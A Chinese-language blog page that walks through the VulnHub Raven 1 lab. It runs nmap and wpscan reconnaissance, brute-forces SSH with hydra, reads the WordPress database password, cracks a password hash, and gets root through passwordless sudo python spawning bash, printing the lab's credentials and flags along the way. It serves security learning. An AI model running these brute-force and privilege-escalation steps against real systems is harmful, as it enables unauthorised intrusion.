@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title> - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="">
+<meta itemprop="description" content="靶机介绍 这是一个boot2root靶机，目标为获取root权限，读取flag内容 靶机下载地址 https://download.vulnhub.com/raven/Raven.ova
+靶机运行 该靶机格式为OVA格式，可导入到VMware或者VirtualBox虚拟中运行即可。
+信息收集 查看靶机地址，通过扫描虚拟机网段，找到靶机ip为10.10.10.138
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 09:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00029s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00023s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.138 Host is up (0.00021s latency). MAC Address: 00:0C:29:67:8F:F1 (VMware) Nmap scan report for 10.10.10.254 Host is up (0.">
+
+<meta itemprop="wordCount" content="957">
+
+
+
+<meta itemprop="keywords" content="" /><meta property="og:title" content="" />
+<meta property="og:description" content="靶机介绍 这是一个boot2root靶机，目标为获取root权限，读取flag内容 靶机下载地址 https://download.vulnhub.com/raven/Raven.ova
+靶机运行 该靶机格式为OVA格式，可导入到VMware或者VirtualBox虚拟中运行即可。
+信息收集 查看靶机地址，通过扫描虚拟机网段，找到靶机ip为10.10.10.138
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 09:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00029s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00023s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.138 Host is up (0.00021s latency). MAC Address: 00:0C:29:67:8F:F1 (VMware) Nmap scan report for 10.10.10.254 Host is up (0." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/raven_1/" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="靶机介绍 这是一个boot2root靶机，目标为获取root权限，读取flag内容 靶机下载地址 https://download.vulnhub.com/raven/Raven.ova
+靶机运行 该靶机格式为OVA格式，可导入到VMware或者VirtualBox虚拟中运行即可。
+信息收集 查看靶机地址，通过扫描虚拟机网段，找到靶机ip为10.10.10.138
+root@kali:~# nmap -sn 10.10.10.* Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 09:52 CST Nmap scan report for 10.10.10.1 Host is up (0.00029s latency). MAC Address: 00:50:56:C0:00:08 (VMware) Nmap scan report for 10.10.10.2 Host is up (0.00023s latency). MAC Address: 00:50:56:E2:1F:31 (VMware) Nmap scan report for 10.10.10.138 Host is up (0.00021s latency). MAC Address: 00:0C:29:67:8F:F1 (VMware) Nmap scan report for 10.10.10.254 Host is up (0."/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+				<div class="matter">
+					<h1 class="title"></h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h3 id="靶机介绍">靶机介绍</h3>
+<p>这是一个boot2root靶机，目标为获取root权限，读取flag内容
+靶机下载地址
+<code>https://download.vulnhub.com/raven/Raven.ova</code></p>
+<h3 id="靶机运行">靶机运行</h3>
+<p>该靶机格式为OVA格式，可导入到VMware或者VirtualBox虚拟中运行即可。</p>
+<h3 id="信息收集">信息收集</h3>
+<p>查看靶机地址，通过扫描虚拟机网段，找到靶机ip为<code>10.10.10.138</code></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -sn 10.10.10.*
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 09:52 CST
+Nmap scan report for 10.10.10.1
+Host is up (0.00029s latency).
+MAC Address: 00:50:56:C0:00:08 (VMware)
+Nmap scan report for 10.10.10.2
+Host is up (0.00023s latency).
+MAC Address: 00:50:56:E2:1F:31 (VMware)
+Nmap scan report for 10.10.10.138
+Host is up (0.00021s latency).
+MAC Address: 00:0C:29:67:8F:F1 (VMware)
+Nmap scan report for 10.10.10.254
+Host is up (0.00012s latency).
+MAC Address: 00:50:56:EB:B4:38 (VMware)
+Nmap scan report for 10.10.10.136
+Host is up.
+Nmap done: 256 IP addresses (5 hosts up) scanned in 2.27 seconds
+
+</code></pre></div><p>扫描ip判断，靶机开放的服务以及端口，当前靶机开放22、80、111、49396，有用的端口应该只有22和80</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# nmap -A -sV -p- 10.10.10.138
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 09:52 CST
+Nmap scan report for 10.10.10.138
+Host is up (0.0029s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
+| ssh-hostkey: 
+|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
+|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)                                                                                                                                                    
+|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)                                                                                                                                                   
+|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)                                                                                                                                                 
+80/tcp    open  http    Apache httpd 2.4.10 ((Debian))                                                                                                                                                            
+|_http-server-header: Apache/2.4.10 (Debian)                                                                                                                                                                      
+|_http-title: Raven Security                                                                                                                                                                                      
+111/tcp   open  rpcbind 2-4 (RPC #100000)                                                                                                                                                                         
+| rpcinfo:                                                                                                                                                                                                        
+|   program version    port/proto  service                                                                                                                                                                        
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100024  1          43049/udp   status
+|   100024  1          45072/udp6  status
+|   100024  1          49396/tcp   status
+|_  100024  1          57595/tcp6  status
+49396/tcp open  status  1 (RPC #100024)
+MAC Address: 00:0C:29:67:8F:F1 (VMware)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.9
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   2.94 ms 10.10.10.138
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.20 seconds
+root@kali:~# rpcinfo -p 10.10.10.138
+
+</code></pre></div><p>访问<code>http://10.10.10.138/</code>，发现是一个类似公司介绍的网站
+<img src="/images/2019/Raven_1/20e185685e25da04af9f3c6bb52b0941.png" alt="20e185685e25da04af9f3c6bb52b0941.png"></p>
+<p>开始访问的时候会出现图片加载不出的情况，查看源码发现网站将<code>http://raven.local</code>写入代码中，我们需要将<code>raven.local</code>加入到<code>/etc/hosts</code>中
+<img src="/images/2019/Raven_1/3a8a40139212bee5ca0031ebf95be433.png" alt="3a8a40139212bee5ca0031ebf95be433.png"></p>
+<p>使用gobuster跑一下目录，看看有没有敏感目录
+<code>/gobuster dir -u http://10.10.10.138/ -t 20 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -s 200,301,302 -x php,html,htm</code>
+<img src="/images/2019/Raven_1/177fb2e20c268963bb62f75e473ad622.png" alt="177fb2e20c268963bb62f75e473ad622.png"></p>
+<p>发现了存在目录列出漏洞，但是没发现什么有用的信息，查看目录信息发现该网站使用WordPress搭建
+<img src="/images/2019/Raven_1/5403b266bbbd58aed2f9b9382b156ac9.png" alt="5403b266bbbd58aed2f9b9382b156ac9.png">
+未发现其他可利用漏洞</p>
+<p>使用wpscan扫描目标，未发现有漏洞的插件，但是发现了两个用户名 michal和steven</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:~# wpscan --url http://raven.local/wordpress/ -e u vp
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.7.5
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
+_______________________________________________________________
+
+[+] URL: http://raven.local/wordpress/
+[+] Started: Tue Jan  7 12:40:46 2020
+
+Interesting Finding(s):
+
+[+] http://raven.local/wordpress/
+ | Interesting Entry: Server: Apache/2.4.10 (Debian)
+ | Found By: Headers (Passive Detection)
+ | Confidence: 100%
+
+[+] http://raven.local/wordpress/xmlrpc.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+ | References:
+ |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
+ |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
+ |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access
+
+[+] http://raven.local/wordpress/readme.html
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 100%
+
+[+] http://raven.local/wordpress/wp-cron.php
+ | Found By: Direct Access (Aggressive Detection)
+ | Confidence: 60%
+ | References:
+ |  - https://www.iplocation.net/defend-wordpress-from-ddos
+ |  - https://github.com/wpscanteam/wpscan/issues/1299
+
+[+] WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
+ | Found By: Rss Generator (Passive Detection)
+ |  - http://raven.local/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.7&lt;/generator&gt;
+ |  - http://raven.local/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.8.7&lt;/generator&gt;
+
+[+] WordPress theme in use: twentyseventeen
+ | Location: http://raven.local/wordpress/wp-content/themes/twentyseventeen/
+ | Last Updated: 2019-05-07T00:00:00.000Z
+ | Readme: http://raven.local/wordpress/wp-content/themes/twentyseventeen/README.txt
+ | [!] The version is out of date, the latest version is 2.2
+ | Style URL: http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.7
+ | Style Name: Twenty Seventeen
+ | Style URI: https://wordpress.org/themes/twentyseventeen/
+ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
+ | Author: the WordPress team
+ | Author URI: https://wordpress.org/
+ |
+ | Found By: Css Style In Homepage (Passive Detection)
+ |
+ | Version: 1.3 (80% confidence)
+ | Found By: Style (Passive Detection)
+ |  - http://raven.local/wordpress/wp-content/themes/twentyseventeen/style.css?ver=4.8.7, Match: &#39;Version: 1.3&#39;
+
+[+] Enumerating Users (via Passive and Aggressive Methods)
+ Brute Forcing Author IDs - Time: 00:00:01 &lt;=========================================================&gt; (10 / 10) 100.00% Time: 00:00:01
+
+[i] User(s) Identified:
+
+[+] michael
+ | Found By: Author Posts - Author Pattern (Passive Detection)
+ | Confirmed By:
+ |  Rss Generator (Passive Detection)
+ |  Wp Json Api (Aggressive Detection)
+ |   - http://raven.local/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ |  Login Error Messages (Aggressive Detection)
+
+[+] steven
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
+[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up.
+
+[+] Finished: Tue Jan  7 12:40:51 2020
+[+] Requests Done: 54
+[+] Cached Requests: 7
+[+] Data Sent: 13.728 KB
+[+] Data Received: 510.293 KB
+[+] Memory used: 111.685 MB
+[+] Elapsed time: 00:00:04
+</code></pre></div><p>使用<code>cewl -w d.txt http://raven.local/</code>，获取网页内容生成字典<code>d.txt</code></p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt# cewl -w d.txt http://raven.local/
+CeWL 5.4.6 (Exclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+root@kali:/opt# ls
+d.txt 
+</code></pre></div><h3 id="漏洞利用">漏洞利用</h3>
+<p>获得密码字典，优先尝试爆破ssh，使用hydra进行爆破，成功得到密码michael与账号相同</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">root@kali:/opt# hydra -L u.txt -P d.txt -f -e nsr -t 30 ssh://10.10.10.138
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-01-07 12:54:24
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 30 tasks per 1 server, overall 30 tasks, 492 login tries (l:2/p:246), ~17 tries per task
+[DATA] attacking ssh://10.10.10.138:22/
+[22][ssh] host: 10.10.10.138   login: michael   password: michael
+[STATUS] attack finished for 10.10.10.138 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-01-07 12:54:25
+
+</code></pre></div><p>尝试登陆，成功当前用户为普通用户
+<img src="/images/2019/Raven_1/7845be85214d296da9e6c70082652a50.png" alt="7845be85214d296da9e6c70082652a50.png"></p>
+<p>查看当前运行的服务，发现还有个mysql服务正在运行
+<img src="/images/2019/Raven_1/d8737d5f640f98ff5de5729602d897cc.png" alt="d8737d5f640f98ff5de5729602d897cc.png"></p>
+<p>查看WordPress配置文件，找到mysql密码，发现为<code>root</code>账户，密码为<code>R@v3nSecurity</code>
+<img src="/images/2019/Raven_1/57e74c93fd05b1d961deeb39c4310e53.png" alt="57e74c93fd05b1d961deeb39c4310e53.png"></p>
+<p>在进入/var/www/目录时发现了flag2
+<code>flag2{fc3fd58dcdad9ab23faca6e9a36e581c}</code>
+既然有flag2，就应该有flag1没有被发现。。去找找，经过查<code>http://raven.local/service.html</code>页面html源码发现flag1<code> flag1{b9bbcb33e11b80be759c4e844862482d}</code></p>
+<p>通过mysql读取wp_users表内容，发现用户<code>steven</code>的密码保存的密文<code>$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/</code>，通过使用<code>https://www.somd5.com/</code>解密发现密码为<code>pink84</code>，尝试登陆成功
+<img src="/images/2019/Raven_1/f48818dd1ece5d022d0a7ce8ed1262a2.png" alt="f48818dd1ece5d022d0a7ce8ed1262a2.png"></p>
+<h3 id="提权">提权</h3>
+<p>查看当前系统版本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">michael@Raven:~$ uname -a
+Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux
+</code></pre></div><p>查看mysql版本</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">michael@Raven:/var/www/html/wordpress$ mysql -V
+mysql  Ver 14.14 Distrib 5.5.60, for debian-linux-gnu (x86_64) using readline 6.3
+</code></pre></div><p><img src="/images/2019/Raven_1/f5bd073d2bc1aa9aa70193208781fdf8.png" alt="f5bd073d2bc1aa9aa70193208781fdf8.png"></p>
+<p>据说可以通过mysql进行提权，不太会这个</p>
+<p>登陆steven账号，执行<code>sudo -l</code>，查看有管理员权限的程序，发现python可以通过sudo执行但不需要密码
+<img src="/images/2019/Raven_1/eb1f19e2c4f698ede37559ded95ca527.png" alt="eb1f19e2c4f698ede37559ded95ca527.png"></p>
+<p>使用命令<code>sudo python -c 'import pty;pty.spawn(&quot;/bin/bash&quot;)'</code> 以sudo权限执行python调用bash，成功获得root权限
+<img src="/images/2019/Raven_1/9a629efe58fda8ae51aba94dccc958ff.png" alt="9a629efe58fda8ae51aba94dccc958ff.png"></p>
+<p>进入<code>/root</code>目录，发现flag4
+<img src="/images/2019/Raven_1/0b87e50591cb28708c8f05d71b2901d6.png" alt="0b87e50591cb28708c8f05d71b2901d6.png">
+既然有flag4，那就有flag3，翻数据库发现wp_posts表中有flag3
+<code>flag3{afc01ab56b50591e7dccf93122770cd2} </code></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>1  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
